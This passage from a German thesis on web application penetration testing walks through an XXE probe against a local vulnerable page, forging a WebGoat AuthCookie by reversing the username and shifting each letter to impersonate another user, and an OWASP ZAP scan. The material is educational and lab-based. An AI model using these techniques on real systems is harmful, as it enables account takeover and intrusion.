Nun wird den XML-Daten eine interne Entität hinzugefügt und im \texttt{username}-Element mit \texttt{\&u} verweist und die Anfrage erneut gesendet.\\

\begin{LaTeXCode}[caption={Manipulierte Anfrage},captionpos=b][numbers=none]
POST /vulnapps/xxe.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
Accept: text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 98

<xml version="1.0"?>
<!DOCTYPE foo[<!ENTITY u 'username from internal entity'>]>	
	<root>
		<username>\&u;</username>
		<password>supersecurepassword</password>
	</root>\\
\end{LaTeXCode}

Hier soll nochmal beachtet werden, dass die Anwendung der interne Einheit auflöst und die \texttt{XXE}-Sicherheitsanfälligkeit erfolgreich bestätigt.\\

\begin{LaTeXCode}[caption={Bestätigung der XXE-Schwachstelle},captionpos=b][numbers=none]
	HTTP/1.1 200 OK
	Date: Sun, 20 May 2018 06:31:39 GMT
	Server: Apache/2.4.27 (Win64) PHP/5.6.31
	X-Powered-By: PHP/5.6.31
	Content-Length: 16
	Connection: close
	Content-Type: text/html; charset-UTF-8	
	
	username: username from internal entity\\
\end{LaTeXCode}

\subsection{Testen von Fehlerhafte Authentifizierung mit Webgoat und Burp Suite}
Dieses Tutorial stammt von der Webseite Tutorialspoint\cite{tpfa15}.
Eine Webanwendung unterstützt das Umschreiben von URLs, indem \texttt{Sitzungs-IDs} in den Link eingefügt werden.\\

\texttt{http://beispiel.com/auktion/auktionitem/jsessionid=2P0OSNDLPSKHC}

\texttt{KJ2SD/?item=macbookpro}\\

Ein authentifizierter Benutzer der Webseite leitet die URL an seine Freunde weiter, um Informationen zu den reduzierten Verkäufen zu erhalten. Er sendet die oben angegebene \texttt{URL} per E-Mail, ohne zu wissen, dass der Benutzer auch die \texttt{Sitzungs-IDs} verschenkt. Wenn seine Freunde den Link verwenden, verwenden sie seine Sitzung und seine Kreditkarte.\\

Man muss sich bei Webgoat anmelden und zum Abschnitt \texttt{Session Management Flaws} navigieren.\\

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=10cm]{fa2.jpg}
	\caption{Anmeldung bei Webgoat}
\end{figure}

Wenn mit den Anmeldeinformationen \texttt{webgoat/webgoat} eingegeben werden, wird in Burp Suite festgestellt, dass die \texttt{JSESSION-ID C8F3177CCAFF380441ABF71090748F2E} lautet, während \texttt{AuthCookie = 65432ubphcfx} nach erfolgreicher Authentifizierung ist.

\begin{figure}[h]
	\centering
	\includegraphics[width=10cm]{fa3.jpg}
	\caption{Burp Suite: AuthCookie Kontrolle 1}
\end{figure}

Wenn eineAnmeldung mit den Anmeldeinformationen \texttt{aspect/aspect} erfolgt, wird in Burp Suite festgestellt, dass die \texttt{JSESSION-ID C8F3177CCAFF380441ABF71090748F2E} lautet, während \texttt{AuthCookie = 65432udfqtb} nach erfolgreicher Authentifizierung ist.

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=10cm]{fa4.jpg}
	\caption{Burp Suite: AuthCookie Kontrolle 2}
\end{figure}

Nun müssen die AuthCookie Patterns analysiert werden. Die erste Hälfte \texttt{65432} ist für beide Authentifizierungen üblich. Daher ist nun von Interesse, den letzten Teil der AuthCookie-Werte zu analysieren, wie \texttt{ubphcfx} für den Benutzer \texttt{webgoat} und \texttt{udfqtb} für den jeweiligen Aspektbenutzer.\\

\begin{figure}[h]
	\centering
	\includegraphics[width=10cm]{fa5.jpg}
	\caption{Burp Suite: AuthCookie Kontrolle 3}
\end{figure}

Wenn die AuthCookie-Werte genauer angesehen werden, hat der letzte Teil dieselbe Länge wie der Benutzername. Es ist daher offensichtlich, dass der Benutzername bei einer Verschlüsselungsmethode verwendet wird. Bei Versuchen und Fehlern / Brute-Force-Mechanismen wird festgestellt, dass nach der Umkehrung des Benutzernamens \texttt{webgoat}; es wird jetzt rausgefunden, dass er \texttt{taogbew} ist und dann wird das Zeichen vor dem Alphabet als AuthCookie d. h. \texttt{ubphcfx} verwendet.

\newpage

Nach der Authentifizierung als Benutzer \texttt{Webgoat} den AuthCookie-Wert geändert wird, um den Benutzer Alice zu verspotten, indem den AuthCookie gesucht wird.

\begin{figure}[h]
	\centering
	\includegraphics[width=10cm]{fa6.jpg}
	\caption{Authentifizierung mit dem Cookie}
\end{figure}

\section{Automatisierte Penetrationstest}

Wie im Abschnitt \ref{owaspzap-def} erwähnt, ist OWASP ZAP ein benutzerfreundliches integriertes Penetrationstest-Tool zum Auffinden von Schwachstellen in Webanwendungen. ZAP bietet automatisierte Scanner sowie eine Reihe von Tools, mit denen die Sicherheitslücken automatisch gesucht werden können. In diesem Abschnitt wird die OWASP ZAP-GUI vorgestellt. Darüber hinaus wird beschrieben, wie automatische Penetrationstests mit dem Sicherheitstool OWASP Zap durchgeführt werden. Außerdem bilden die in diesem Kapitel erläuterten Informationen die Basis für die in Kapitel 5 vorgenommene Evaluierung des Open API 2.0 Plugins von OWASP ZAP und sind demzufolge für das Verständnis der Verwendung des Open API 2.0 Plugins erforderlich.

\subsection{OWASP-ZAP Webanwendung Penetrationstest}

\subsubsection{Die Vorstellung von OWASP ZAP Oberfläche}

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=12cm]{owaspzapgui.png}
	\caption{OWASP ZAP GUI Überblick}
	\label{owaspguiabbildung}
\end{figure}

Wie in Abbildung \ref{owaspguiabbildung} zu sehen, ist das GUI-Fenster in drei Hauptabschnitte unterteilt:\\

\begin{flushleft}
	\textbf{Linker Bereich:}\\
\end{flushleft}
Im linken Bereich des ZAP-Fensters werden die Dropdown-Schaltflächen Context und Sites angezeigt. Es kann vorkommen, dass mehrere Webseiten zum Scannen ausgewählt werden können. Diese werden unter Sites angezeigt.

\begin{flushleft}
	\textbf{Rechter Bereich:}\\
\end{flushleft}
Hier gibt es einen URL-Abschnitt, in dem das Ziel für das Scannen angegeben werden muss. Die Schaltfläche Attack startet den Angriff auf das Ziel und die Schaltfläche Stop stoppt den Angriff.

\begin{flushleft}
	\textbf{Unterer Bereich:}\\
\end{flushleft}
Dieser Abschnitt enthält sechs Tabs, die für die Darstellung der Aktivitäten während der Schwachstellensuche wichtig sind. Unter den Tabs befindet sich eine Fortschrittsleiste, in der der Scanfortschritt, die Anzahl der gesendeten Anforderungen und der Export der Details im CSV-Format angezeigt werden.\\

Das Tab \textbf{"`History"'} zeigt die getesteten Webseiten an. In diesem Fall testen wir nur ein einzelnes Ziel, sodass im Verlaufsdatensatz ein einzelner Eintrag angezeigt wird.\\

Auf dem Tab \textbf{"`Search"'} kann der Tester Suche nach Mustern durchführen. Zum Beispiel werden alle GET-Anfragen abgefragt und die dazu gehörenden Informationen werden angezeigt.\\

Auf dem Tab \textbf{"`Alerts"'} können weitere Informationen zu den erkannten Sicherheitslücken des gescannten Ziels gefunden werden und die Ausgaben werden nach Schweregrad eingestuft.\\

Auf dem Tab \textbf{"`Spider"'} werden die Dateien angezeigt, die in der Webanwendung gecrawlt (erkannt) wurden. Durch den Spider werden die auf der Webseite residenten Verzeichnisse und Dateien ermittelt und für eine spätere Überprüfung auf Schwachstellen protokolliert.\\

Das letzte Tab ist der \textbf{"`Active Scan"'}. Dieser ist wichtig, um den Fortschritt des laufenden Scans in Echtzeit zu demonstrieren, wobei jede verarbeitete Datei angezeigt wird.\\

\subsubsection{Schneller Scan \& Angriff}

Um den Schnellscan zu starten, wird die Adresse des Ziels in das Eingabefeld \texttt{URL to attack} eingegeben und es wird auf die Schaltfläche \texttt{Attack} geklickt.

\begin{figure}[h]
	\centering
	\includegraphics[width=12cm]{owaspzapgui2.png}
	\caption{URL zum Spider}
	\label{quickscan2}
\end{figure}

Dadurch wird die gesamte Zielwebsite gesichtet und anschließend nach Schwachstellen durchsucht. Der Scan-Fortschritt und die gefundenen Seiten werden wie bei der Abbildung \ref{quickscan3} im unteren Fenster angezeigt.

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=12cm]{owaspzapgui3.png}
	\caption{Spider Ergebnis}
	\label{quickscan3}
\end{figure}

Wenn das Active Scan fertig ist, wird auf "`Alerts"' geklickt, um Sicherheitsprobleme der Website wie folgt anzuzeigen:

\begin{figure}[h]
	\centering
	\includegraphics[width=12cm]{owaspzapgui4.png}
	\caption{Gefundene Sicherheitslücken}
	\label{quickscan4}
\end{figure}

Jeder Ordner enthält verschiedene Arten von Sicherheitsproblemen, die für den Schweregrad farbcodiert sind. Durch Klicken auf den Ordner werden einzelne Probleme angezeigt, die für zusätzliche Informationen ausgewählt werden können. Der Ordner enthält nicht nur eine detaillierte Erklärung des Problems, sondern auch Empfehlungen zur Lösung des Problems.

\section{Vor- und Nachteile zwischen manuelle und automatisierte Penetrationstest}

Beim Penetrationstest kann der Tester entweder manuelle oder automatisierte oder beide Methoden anwenden, um die Schwachstellen in der Webanwendung zu ermitteln. Die Methoden der Tester basieren auf ihren Fähigkeiten und Kenntnissen. Es gibt jedoch einige Faktoren, z. B. Wirksamkeit, benötigte Zeit oder Zuverlässigkeit einer Methode, die in Betracht gezogen werden sollten, bevor sie angewendet werden. Manuelle- und automatisierte Penetrationstests können beide verwendet werden, um kritische Sicherheitslücken in Webanwendungen zu finden, von denen jede eigene Stärken und Schwächen aufweist. Ein Anwendungskontext sollte bei der Entscheidung helfen, welche Methode die geeignetere ist. Der Kontext umfasst Folgendes: Wie groß ist die Anwendung, wie hoch ist das Budget des Projekts und wann soll es freigegeben werden?

Automatisierte Werkzeuge arbeiten in der Größenordnung erheblich schneller und sind eine sichere und einfache Methode, um alle Aufgaben im Zusammenhang mit dem Penetrationstest durchzuführen. Da die meisten Aufgaben automatisiert sind, können Tests weniger zeitaufwendig sein als manuelle Tests. Es ist schwieriger, die einzelnen Komponenten, Dienste und Protokolle manuell mit der gleichen Geschwindigkeit zu testen, die eine Maschine ausführen kann. Weil automatisierte schneller als manuelle Tests sind, werden die Ergebnisse auch schneller akkumuliert. Sicherheitsberichte werden automatisch generiert und können zur Offline-Prüfung als XML-, PDF- oder HTML-Dateien exportiert werden\cite{autovorteil99}.

Durch den automatisierten Penetrationstest können größere Angriffsflächen leichter abgedeckt werden, indem das Crawlen von Webanwendungen implementiert wird, um potenzielle Angriffseingaben, insbesondere technische Schwachstellen, zu erkennen. Manuelles Testen würde viel Zeit erfordern, um die gleiche Abdeckung und den gleichen Vergleich mit bekannten Schwachstellen gewährleisten zu können\cite{packetlabs18}.

Automatisierte Tools können eine große Anzahl von Inputdaten für jeden Test initialisieren und ausführen, können sich jedoch nicht dafür entscheiden, die Inputdaten für jedes Szenario korrekt auszuführen. Es wird normalerweise mit mehreren Inputdaten übertragen und auf eine Reaktion gewartet, d. h., es ist schwierig für automatisierte Tools, die Webanwendungen und -dienste genau zu testen, wodurch logische Schwachstellen übersehen werden können\cite{packetlabs18}.

Automatisiertes Testen bietet Vorteile für größere Projekte, da die anfänglichen Kosten für die Automatisierung und die Testwartung hoch sein können. Automatisierung hilft dabei, menschliche Fehler zu vermeiden. Fehler, die bei manuellen Tests auftreten, können reduziert werden. Dies betrifft Fehler, die durch die Durchführung einer langen Liste alltäglicher Aktivitäten entstanden sind. Die einfache Reproduzierbarkeit der Tests ist auch ein bedeutender Vorteil gegenüber dem individuellen Ansatz beim manuellen Testen. Der umfassende Test der manuellen Penetrationstests ist ein komplexer Prozess. Die wiederholten Aufgaben, die während des manuellen Tests ausgeführt werden, können zu ungenauen oder falschen Ergebnissen führen. Dieser Prozess erfordert während der gesamten Testdauer ein Team von erfahrenen Testern, was hohe Kosten mit sich bringt. Diese Tester müssen erfahren sein, da sie alle Aufgaben manuell steuern müssen. Bei automatisierten Anwendungssicherheitstests wird weniger Personal benötigt, um das Scannen und die Analyse durchzuführen\cite{autovorteil99}.

Automatisierung kann zu den folgenden Kostensenkungen führen. Die Kosten für\cite{autovorteil99}: 

\begin{itemize} 
	\item die Entwicklung automatisierter Tests.
	\item die Verbesserung der Tests, wenn sich das Produkt ändert.
	\item die Überprüfung der Testergebnisse.
\end{itemize} 

Automatisierte Tools sind nur so zuverlässig wie ihre Updates. Wenn eine neue Sicherheitsanfälligkeit oder ein Exploit ohne bekannte Kategorie in die Umgebung eingeführt wurde, können die automatisierten Tools die Sicherheitsbedrohung nicht erkennen und identifizieren. Beim manuellen Testen kann der Tester je nach Situation und Schwachstelle einen eigenen Exploit erstellen. Dies ermöglicht die Ausführung einer umfassenden Testmethodik, da automatisierte Tools übersehen und nicht erkannt werden\cite{packetlabs18}.

Ausführliche manuelle Pentests werden von erfahrenen Sicherheitsexperten ausgeführt, die versuchen, eine Webanwendung zu gefährden. Sie helfen dabei, Schwachstellen zu erkennen und komplexe Angriffsvektoren zu identifizieren. Die Menge an täglich übertragenen Codes stellt jedoch eine Herausforderung dar, da es für Sicherheitsteams immer schwieriger wird, die neuesten Bedrohungen zu beobachten. Hier kommen automatisierte Sicherheitstests zum Einsatz. Automatisierte Test-Tools werden regelmäßig gegen eine Webanwendung ausgeführt und werden laufend mit neuen Sicherheitstests aktualisiert. Mit Hilfe der Automatisierung können Schwachstellen entdeckt werden, bevor ein neuer Code in die Produktion übernommen wird\cite{wmpta17}.

Die Unternehmen begannen, automatisierte Testtechniken für Webanwendungen zu entwickeln. Zu diesem Zeitpunkt wurde das Web reifer und die Webbrowser waren in der Lage, die Komplexität dynamischer Anwendungen zu beherrschen. Das Ziel dieser frühen automatisierten Testwerkzeuge war, durch die Automatisierung des Ermittlungsprozesses einer Webanwendung und das Einfügen von Fehlern dazu beizutragen, Schwachstellen zu entdecken. Mit dem Ausreifen automatisierter Tools für die Sicherheit von Webanwendungen wurden die meisten dieser Probleme angegangen. Da die Webanwendungen jedoch immer größer werden, wird das manuelle Testen zunehmend schwieriger. In vielen Unternehmen wird es unmöglich werden, Zeit, Aufwand und Kosten für die Bewertung des Unternehmens zu investieren bei der steigenden Anzahl von Webanwendungen. Letztlich kann der Mensch nur so viele Codezeilen pro Tag betrachten. Wenn sich das Anwendungsvolumen vergrößert, werden auch die kostspieligen Testfälle unerschwinglich\cite[2--5]{wasasibm08}.

Unabhängig davon, ob manuelle oder automatisierte Sicherheitstesttechniken verwendet werden, ist es wichtig, das Softwareverhalten zu analysieren, um festzustellen, ob tatsächlich gegen die Grundsätze der Vertraulichkeit (Confidentiality), Integrität (Integrity) oder Verfügbarkeit (Availability) (zusammengefasst: CIA) verstoßen wurde\cite{moaast17}.











